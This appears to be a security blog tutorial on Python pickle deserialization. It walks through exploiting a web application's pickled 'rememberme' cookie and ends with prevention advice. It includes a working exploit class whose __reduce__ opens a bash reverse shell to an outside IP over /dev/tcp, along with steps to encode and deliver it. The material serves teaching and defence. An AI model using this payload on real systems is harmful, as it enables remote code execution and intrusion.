---
layout: post
title: "Deserialization Attack Using Python's Pickle Module"
subtitle: "And a practical use-case"
date: 2022-04-27 09:00:00 -0400
background: '/img/bg-about.jpg'
---
# Deserialization Attack Using Python's Pickle Module

![python-pickle-logo.png](/img/posts/serialization-pickle/python-pickle-800x200.png)

## Serialization explained

Serialization is a process of converting an object into a stream of bytes to store the object or transmit it to memory, a database, or a file.
<br>  
![packing-serialization](/img/posts/serialization-pickle/c-sharp-serialization.png)
<br>  
This is done for a variety of reasons, some of them being :

-Persistence: storing an object in its current state for later retrieval; eg. App memory gets cleared from RAM upon exit, but the application has serialized and saved the objects to disk before it exited - so it can easily retrieve them later

-Ease of communication: two machines running the same code can use serialized objects for communication - one machine can build an object and serialize it and then send it over to the other machine

-Network transmission: serialized objects are used by web applications to ensure faster data transmission and integrity

## Python's pickle module

The Pickle module is native to Python, and "Pickling" is the process where a Python object is converted into a byte stream, and "Depickling" is the opposite - where a byte stream is converted back to an object.


## Practical use-case

Consider a web application which uses pickled data as the cookie value.
<br>  
![request-burp](/img/posts/serialization-pickle/request.png)
<br>  
How can we guess this is pickled data? By decoding the "rememberme" cookie value, its visible that it looks like a pickled value:
<br>  
![rememberme-cookie-value](/img/posts/serialization-pickle/rememberme-cookie-value.png)
<br>  
We can now generate our pickled object to get code execution. This is a sample python code which we can use:

```
import cPickle
import os
class exploit(object):
  def __reduce__(self):
    return (os.system,("/bin/bash -i >& /dev/tcp/10.10.14.123/80 0>&1",))
e = exploit()
print cPickle.dumps(e)
```

Note the result when running the code :
<br>  
![pickled-object](/img/posts/serialization-pickle/pickled-object.png)
<br>  
Since this object is being used by the web application, to ensure data integrity - it is base64 encoded:
<br>  
![b64-pickled_object](/img/posts/serialization-pickle/b64-pickled_object.png)
<br>  
Once this is done we can simply set up our listener and paste the b64 payload into the "rememberme" cookie value and after sending the request it will result in code execution - and in this case a reverse shell.

## Prevention

It is widely considered that unserializing data from an untrusted source or giving the users ability control over the objects is a bad idea.

The pickle module is NOT intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.

If the application needs to ensure that the data has not been tampered with - consider using HMAC ((Hash-based Message Authentication Code) - which is available as a separate Python module.